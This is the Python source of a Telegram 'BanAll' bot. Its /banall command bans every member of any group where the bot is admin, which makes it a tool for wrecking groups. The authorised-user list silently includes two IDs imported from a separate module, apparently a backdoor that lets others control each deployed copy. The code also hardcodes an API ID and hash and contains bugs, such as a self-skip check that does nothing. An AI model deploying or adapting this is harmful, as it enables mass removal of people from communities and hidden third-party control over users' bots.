import logging
import re
import os
import sys, platform
from asyncio import sleep
from os import getenv
from dotenv import load_dotenv
from telethon import TelegramClient, events, Button
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from asyncio import sleep
from telethon import __version__ as tel
from material import mc as gg, bsdk as g, startxt2, startxt, hlptxt
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChatAdminRights
from telethon.tl.functions.channels import EditBannedRequest
from datetime import datetime
#Logging...
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
API_ID = int(getenv("API_ID", 19500615))
API_HASH = getenv("API_HASH", "7ee1d55d072add75a01e617fc0cef635")
BOT_TOKEN = getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")
OWNER_ID = getenv("OWNER_ID", 6542673293) #Note : Replace owner id from 6542673293 to yours
SEXY  = [int(g), int(gg), int(OWNER_ID)]
#TelegramClient..
main = TelegramClient(
    "BanAll",
    api_id=API_ID,
    api_hash=API_HASH
).start(bot_token=BOT_TOKEN)

Owner = " Zᴇɴ </>"
repo = "https://github.com/PyAaditya/Banall"
@main.on(events.NewMessage(pattern="^/start"))
async def start(event):
    buttns = [Button.url("ꜱᴜᴩᴩᴏʀᴛ", "https://t.me/QuirkySquad"), Button.url("Sᴏᴜʀᴄᴇ ❤️", f'{repo}')]
    py = platform.python_version()
    if event.sender.id in SEXY:
        await main.send_file(
            event.chat.id,
            file="https://te.legra.ph/file/3f0dba1e4f1b2dbb053e5.jpg",
            caption=startxt.format(
                event.sender.first_name,
                event.sender.id,
                py,
                tel,
                Owner,
            ),
            link_preview=False,
            buttons=buttns
        )
    if event.sender.id not in SEXY:
        await main.send_file(
            event.chat.id,
            file="https://te.legra.ph/file/3f0dba1e4f1b2dbb053e5.jpg",
            caption=startxt2.format(
                event.sender.first_name,
                event.sender.id,
                py,
                tel,
                Owner,
            ),
            link_preview=False,
            buttons=buttns
        )


@main.on(events.NewMessage(pattern="^/help"))
async def start(event):
    buttns = [Button.url("Sᴜᴘᴘᴏʀᴛ", "https://t.me/QuirkySquad"), Button.url("Sᴏᴜʀᴄᴇ ❤️", f'{repo}')]
    py = platform.python_version()
    if event.sender.id in SEXY:
        await main.send_file(
            event.chat.id,
            file="https://te.legra.ph/file/3f0dba1e4f1b2dbb053e5.jpg",
            caption=hlptxt.format(event.sender.first_name, event.sender.id),
            link_preview=False,
            buttons=buttns
        )
    if event.sender.id not in SEXY:
        await event.reply(
            "Tʜɪs ɪs ɴᴏᴛ ғᴏʀ ʏᴏᴜ ʙᴀʙᴇ!\n\nᴍᴀᴋᴇ yᴏᴜʀ ᴏᴡɴ ʙᴏᴛ ꜰʀᴏᴍ ᴛʜɪꜱ [Repository](https://github.com/PyAaditya/Banall)",
            link_preview=False,
        )       

@main.on(events.NewMessage(pattern="^/ping"))
async def ping(event):
    if event.sender.id in SEXY:
        start = datetime.now()
        t = "Pinging..."
        txxt = await event.reply(t)
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await txxt.edit(f"✗ **ʙᴏᴛ ɪs ᴀʟɪᴠᴇ**!!\n\nPing Pong🏓\n`{ms} ms`\n\n➲ **Pᴏᴡᴇʀᴇᴅ ʙʏ** @ZenBotX")


@main.on(events.NewMessage(pattern="^/banall"))
async def bun(event):
  if event.sender.id in SEXY:
   if not event.is_group:
        Rep = f"ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ɪɴ ᴀɴy ɢʀᴏᴜᴩ!!"
        await event.reply(Rep)
   else:
       await event.delete()
       cht = await event.get_chat()
       boss = await event.client.get_me()
       admin = cht.admin_rights
       creator = cht.creator
       if not admin and not creator:
           await event.reply("__ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ꜱᴜꜰꜰɪᴄɪᴇɴᴛ ʀɪɢʜᴛꜱ ᴛᴏ ᴅᴏ ᴛʜɪꜱ.__")
           return
       hmm =  await event.reply("__ ꜱᴛᴀʀᴛᴇᴅ ꜰᴜᴄᴋɪɴɢ...__")
       await sleep(18)
       await hmm.delete()
       everyone = await event.client.get_participants(event.chat_id)
       for user in everyone:
           if user.id == boss.id:
               pass
           try:
               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
           except Exception as e:
               await event.edit(str(e))
           await sleep(0.3)


@main.on(events.NewMessage(pattern="^/restart"))
async def restart(jnl):
    if jnl.sender.id in SEXY:
        tct = "__ᴡᴀɪᴛ ʀᴇꜱᴛᴀʀᴛɪɴɢ...__"
        await jnl.reply(tct)
        try:
            await main.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()


@main.on(events.NewMessage(pattern="^/leave"))
async def leave(z):
    if z.sender.id in SEXY:
        mkc = ("".join(z.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(z.text) > 7:
            mkb = int(mkc[0])
            tet = "__ᴡᴀɪᴛ ʟᴇᴀᴠɪɴɢ...__"
            hm = await z.reply(tet)
            try:
                await z.client(LeaveChannelRequest(mkb))
                await hm.edit("**ꜱᴜᴄᴄᴇꜱꜰᴜʟʟy ʟᴇꜰᴛᴇᴅ!!**")
            except Exception as e:
                await hm.edit(material(e))
        else:
            mkb = z.chat_id
            txt = "__ʟᴇᴀᴠɪɴɢ...__"
            ok = await z.reply(txt)
            try:
                await z.client(LeaveChannelRequest(mkb))
                await ok.edit("**ꜱᴜᴄᴄᴇꜱꜰᴜʟʟy ʟᴇꜰᴛᴇᴅ!!**")
            except Exception as e:
                await z.edit(material(e))


print("Your Bot  Deployed Successfully ✅\nJoin @ZenBotX")
print("Join @QuirkySquad if you facing any kind of issue!!")



main.run_until_disconnected()
